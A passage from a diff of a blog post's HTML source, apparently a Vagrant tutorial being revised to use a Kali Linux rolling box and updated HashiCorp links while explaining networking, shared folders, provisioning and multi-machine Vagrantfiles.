-&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-  &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ubuntu/trusty64&amp;quot;&lt;/span&gt;
+&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;kalilinux/rolling&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;end&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;/figure&gt;
-
-&lt;p&gt;As you can see, this is plain ruby, so you could use variables, loops, conditions, etc.
-Don't panic if you don't know ruby, the &lt;code&gt;Vagrantfile&lt;/code&gt; can be read like a regular config file.&lt;/p&gt;
-&lt;p&gt;The base image (called "box") I used is Ubuntu 14.04 64 bits.&lt;/p&gt;
+&lt;p&gt;As you might have noticed, this is plain ruby, so you could use variables, loops, conditions, etc.
+Don't panic if you don't know ruby, the &lt;code&gt;Vagrantfile&lt;/code&gt; is simple enough that it can be read like a regular config file.&lt;/p&gt;
+&lt;p&gt;The base image (called "box") I used is Kali Linux &lt;a href="https://www.kali.org/docs/general-use/kali-branches/"&gt;rolling&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Put this file in a new folder and use &lt;code&gt;vagrant up&lt;/code&gt; to create the virtual machine.
 Remember when I told you it'd take 30 seconds?&lt;/p&gt;
-&lt;p&gt;&lt;img alt="I lied!" src="https://blog.jclariviere.com/images/i-lied.png" /&gt;&lt;/p&gt;
-&lt;p&gt;The box first needs to be downloaded to a local repository, but future machines using this box will use the local version.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="I lied!" src="https://jclariviere.com/images/i-lied.png"&gt;&lt;/p&gt;
+&lt;p&gt;The box needs to be downloaded locally when it's first used.
+But! The next machine created from it will be set up much faster.&lt;/p&gt;
 &lt;p&gt;You should see the VM in the VirtualBox GUI, but &lt;strong&gt;do not edit the configuration there&lt;/strong&gt; since Vagrant will probably override your settings. Edit the &lt;code&gt;Vagrantfile&lt;/code&gt; instead.&lt;/p&gt;
 &lt;p&gt;When the VM is ready, use &lt;code&gt;vagrant ssh&lt;/code&gt; to SSH into it.
-Most boxes in Vagrant run in &lt;a href="https://en.wikipedia.org/wiki/Headless_software"&gt;headless mode&lt;/a&gt;, but if you need a desktop environment, &lt;a href="https://atlas.hashicorp.com/boxcutter/boxes/ubuntu1404-desktop"&gt;boxcutter's Ubuntu desktop box&lt;/a&gt; seems to work well.&lt;/p&gt;
-&lt;p&gt;To shutdown the VM, use &lt;code&gt;vagrant halt&lt;/code&gt;. To destroy it, use &lt;code&gt;vagrant destroy&lt;/code&gt;. To reboot it, use &lt;code&gt;vagrant reload&lt;/code&gt;.&lt;/p&gt;
+Most boxes in Vagrant run in "headless mode" (no GUI), but some, like Kali Linux, do start a desktop environment that you can use in a different window.&lt;/p&gt;
+&lt;p&gt;You can use these commands to manage the VM:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;vagrant halt&lt;/code&gt; to shut it down&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;vagrant reload&lt;/code&gt; to reboot it&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;vagrant destroy&lt;/code&gt; to destroy it&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h2 id="configuration"&gt;Configuration&lt;/h2&gt;
-&lt;p&gt;You can also use &lt;code&gt;vagrant init&lt;/code&gt; to create a &lt;code&gt;Vagrantfile&lt;/code&gt; with a bunch of options commented out. Let's review the most interesting ones.&lt;/p&gt;
+&lt;p&gt;You can use &lt;code&gt;vagrant init&lt;/code&gt; to create a &lt;code&gt;Vagrantfile&lt;/code&gt; with a bunch of options commented out. Let's review the most interesting ones.&lt;/p&gt;
 &lt;h3 id="box"&gt;Box&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# Every Vagrant development environment requires a box. You can search for&lt;/span&gt;
-&lt;span class="c1"&gt;# boxes at https://atlas.hashicorp.com/search.&lt;/span&gt;
-&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;base&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Every Vagrant development environment requires a box. You can search for&lt;/span&gt;
+&lt;span class="c1"&gt;# boxes at https://vagrantcloud.com/search.&lt;/span&gt;
+&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;base&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;p&gt;In the previous section, I used the official Ubuntu 14.04 box, but you can find more at &lt;a href="https://atlas.hashicorp.com/search"&gt;https://atlas.hashicorp.com/search&lt;/a&gt;.
-The value should be the name of the box (&lt;code&gt;ubuntu/trusty64&lt;/code&gt; for example).&lt;/p&gt;
-&lt;p&gt;You can also use &lt;code&gt;config.vm.box_url&lt;/code&gt; if the box is not in Hashicorp's Atlas. In this case you need a full URL.&lt;/p&gt;
+&lt;p&gt;In the previous section, I used the &lt;code&gt;kalilinux/rolling&lt;/code&gt; box, but you can find more at &lt;a href="https://vagrantcloud.com/search"&gt;https://vagrantcloud.com/search&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;You can also use &lt;code&gt;config.vm.box_url&lt;/code&gt; if the box is not in Hashicorp's Cloud.&lt;/p&gt;
 &lt;h3 id="port-forwarding"&gt;Port forwarding&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# Create a forwarded port mapping which allows access to a specific port&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Create a forwarded port mapping which allows access to a specific port&lt;/span&gt;
 &lt;span class="c1"&gt;# within the machine from a port on the host machine. In the example below,&lt;/span&gt;
 &lt;span class="c1"&gt;# accessing &amp;quot;localhost:8080&amp;quot; will access port 80 on the guest machine.&lt;/span&gt;
-&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;forwarded_port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;guest&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8080&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="c1"&gt;# NOTE: This will enable public access to the opened port&lt;/span&gt;
+&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;forwarded_port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;guest&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;host&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8080&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Port forwarding can be useful if you need to access a service in the VM from a machine on the network but don't want to expose the whole VM.&lt;/p&gt;
 &lt;h3 id="private-network"&gt;Private network&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# Create a private network, which allows host-only access to the machine&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Create a private network, which allows host-only access to the machine&lt;/span&gt;
 &lt;span class="c1"&gt;# using a specific IP.&lt;/span&gt;
-&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;private_network&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.33.10&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;private_network&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.33.10&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;This will create a "host-only network", which allows other VMs and the host to communicate together.
 If the interface doesn't exist on the host, it will create it.&lt;/p&gt;
 &lt;h3 id="public-network"&gt;Public network&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# Create a public network, which generally matched to bridged network.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Create a public network, which generally matched to bridged network.&lt;/span&gt;
 &lt;span class="c1"&gt;# Bridged networks make the machine appear as another physical device on&lt;/span&gt;
 &lt;span class="c1"&gt;# your network.&lt;/span&gt;
-&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;public_network&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;public_network&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;The word &lt;code&gt;public&lt;/code&gt; here is confusing. This will add an interface on the same network as the host.
 Let's say your host has IP &lt;code&gt;192.168.0.100&lt;/code&gt;, your VM could get &lt;code&gt;192.168.0.167&lt;/code&gt;, for example.
 This means you will be able to ping the VM from another computer in the same network.
-&lt;strong&gt;Since Vagrant is &lt;a href="https://docs.vagrantup.com/v2/networking/public_network.html"&gt;insecure by default&lt;/a&gt;, this is probably a bad idea.&lt;/strong&gt;&lt;/p&gt;
+&lt;strong&gt;Since Vagrant is &lt;a href="https://developer.hashicorp.com/vagrant/docs/networking/public_network"&gt;insecure by default&lt;/a&gt;, this is probably a bad idea.&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id="shared-folders"&gt;Shared folders&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# Share an additional folder to the guest VM. The first argument is&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Share an additional folder to the guest VM. The first argument is&lt;/span&gt;
 &lt;span class="c1"&gt;# the path on the host to the actual folder. The second argument is&lt;/span&gt;
 &lt;span class="c1"&gt;# the path on the guest to mount the folder. And the optional third&lt;/span&gt;
 &lt;span class="c1"&gt;# argument is a set of non-required options.&lt;/span&gt;
-&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;synced_folder&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;../data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/vagrant_data&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;synced_folder&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;../data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/vagrant_data&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Share a folder with the host. By default, Vagrant shares the folder containing the &lt;code&gt;Vagrantfile&lt;/code&gt; to the &lt;code&gt;/vagrant&lt;/code&gt; folder in the VM.&lt;/p&gt;
 &lt;h3 id="provider-specific-configuration"&gt;Provider-specific configuration&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# Provider-specific configuration so you can fine-tune various&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Provider-specific configuration so you can fine-tune various&lt;/span&gt;
 &lt;span class="c1"&gt;# backing providers for Vagrant. These expose provider-specific options.&lt;/span&gt;
 &lt;span class="c1"&gt;# Example for VirtualBox:&lt;/span&gt;
 &lt;span class="c1"&gt;#&lt;/span&gt;
-&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provider&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;virtualbox&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;vb&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
-  &lt;span class="c1"&gt;# Display the VirtualBox GUI when booting the machine&lt;/span&gt;
-  &lt;span class="n"&gt;vb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gui&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;
+&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provider&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;virtualbox&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;vb&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;# Display the VirtualBox GUI when booting the machine&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;vb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gui&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kp"&gt;true&lt;/span&gt;
 
-  &lt;span class="c1"&gt;# Customize the amount of memory on the VM:&lt;/span&gt;
-  &lt;span class="n"&gt;vb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;memory&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1024&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="c1"&gt;# Customize the amount of memory on the VM:&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;vb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;memory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1024&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;end&lt;/span&gt;
 &lt;span class="c1"&gt;#&lt;/span&gt;
 &lt;span class="c1"&gt;# View the documentation for the provider you are using for more&lt;/span&gt;
 &lt;span class="c1"&gt;# information on available options.&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Note that customizing the amount of memory is done on a per-provider basis.&lt;/p&gt;
 &lt;h3 id="provisionning"&gt;Provisionning&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# Enable provisioning with a shell script. Additional provisioners such as&lt;/span&gt;
-&lt;span class="c1"&gt;# Puppet, Chef, Ansible, Salt, and Docker are also available. Please see the&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Enable provisioning with a shell script. Additional provisioners such as&lt;/span&gt;
+&lt;span class="c1"&gt;# Ansible, Chef, Docker, Puppet and Salt are also available. Please see the&lt;/span&gt;
 &lt;span class="c1"&gt;# documentation for more information about their specific syntax and use.&lt;/span&gt;
-&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;-&lt;/span&gt;&lt;span class="no"&gt;SHELL&lt;/span&gt;
-&lt;span class="sh"&gt;  sudo apt-get update&lt;/span&gt;
-&lt;span class="sh"&gt;  sudo apt-get install -y apache2&lt;/span&gt;
-&lt;span class="no"&gt;SHELL&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;-&lt;/span&gt;&lt;span class="dl"&gt;SHELL&lt;/span&gt;
+&lt;span class="sh"&gt;  apt-get update&lt;/span&gt;
+&lt;span class="sh"&gt;  apt-get install -y apache2&lt;/span&gt;
+&lt;span class="dl"&gt;SHELL&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Provisionning is used to setup the VM once it is booted.
 Of course, you can simply SSH into the machine and install what you want in it, but adding it in the &lt;code&gt;Vagrantfile&lt;/code&gt; will automate the process if you need multiple VMs or want to share it.&lt;/p&gt;
-&lt;p&gt;You can add your script inline (like the example), but you can also use a script file or configuration managements systems like Chef, Puppet, Ansible or Salt.
-If you use scripts, make sure they are non-interactive! (Add the &lt;code&gt;-y&lt;/code&gt; flag to &lt;code&gt;apt-get install&lt;/code&gt; for example).&lt;/p&gt;
+&lt;p&gt;You can add your script inline (like the example), but you can also use a script file or configuration managements systems like Ansible, Chef, Puppet or Salt.
+If you use scripts, make sure they are non-interactive (add the &lt;code&gt;-y&lt;/code&gt; flag to &lt;code&gt;apt-get install&lt;/code&gt; for example).&lt;/p&gt;
 &lt;p&gt;Provisionning happens in these situations:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;On the &lt;strong&gt;first&lt;/strong&gt; &lt;code&gt;vagrant up&lt;/code&gt;&lt;/li&gt;
@@ -530,100 +366,31 @@ If you use scripts, make sure they are non-interactive! (Add the &lt;code&gt;-y&
 &lt;/ul&gt;
 &lt;h2 id="defining-multiple-machines-in-a-vagrantfile"&gt;Defining multiple machines in a Vagrantfile&lt;/h2&gt;
 &lt;p&gt;To do so, use &lt;code&gt;config.vm.define&lt;/code&gt; in the &lt;code&gt;Vagrantfile&lt;/code&gt;.&lt;/p&gt;
-&lt;figure class='code'&gt;
-&lt;figcaption&gt;&lt;span&gt;Vagrantfile&lt;/span&gt; &lt;a href='/code/vagrantfile-two-machines-trusty64/Vagrantfile'&gt;download&lt;/a&gt;&lt;/figcaption&gt;
+&lt;div class="highlight"&gt;&lt;span class="filename"&gt;Vagrantfile&lt;/span&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# -*- mode: ruby -*-&lt;/span&gt;
-&lt;span class="c1"&gt;# vi: set ft=ruby :&lt;/span&gt;
+&lt;span class="no"&gt;Vagrant&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;box&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;kalilinux/rolling&amp;quot;&lt;/span&gt;
 
-&lt;span class="no"&gt;VAGRANTFILE_API_VERSION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;alice&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;alice&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;network&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;:private_network&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.33.210&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;alice&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;provision&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;shell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;inline&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;echo 192.168.33.211 bob &amp;gt;&amp;gt; /etc/hosts&amp;quot;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;end&lt;/span&gt;
 
